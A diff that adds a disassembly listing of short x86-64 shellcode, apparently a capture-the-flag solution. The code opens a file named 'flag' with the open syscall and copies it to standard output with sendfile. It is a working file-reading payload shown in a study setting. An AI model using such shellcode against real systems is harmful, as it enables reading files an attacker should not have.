@@ -1,0 +1,14 @@
+0x000000001eb25000 | 68 66 6c 61 67                                | push 0x67616c66
+0x000000001eb25005 | 6a 02                                         | push 2
+0x000000001eb25007 | 58                                            | pop rax
+0x000000001eb25008 | 48 89 e7                                      | mov rdi, rsp
+0x000000001eb2500b | 31 f6                                         | xor esi, esi
+0x000000001eb2500d | 0f 05                                         | syscall 
+0x000000001eb2500f | 41 ba ff ff ff 7f                             | mov r10d, 0x7fffffff
+0x000000001eb25015 | 48 89 c6                                      | mov rsi, rax
+0x000000001eb25018 | 6a 28                                         | push 0x28
+0x000000001eb2501a | 58                                            | pop rax
+0x000000001eb2501b | 6a 01                                         | push 1
+0x000000001eb2501d | 5f                                            | pop rdi
+0x000000001eb2501e | 99                                            | cdq 
+0x000000001eb2501f | 0f 05                                         | syscall 
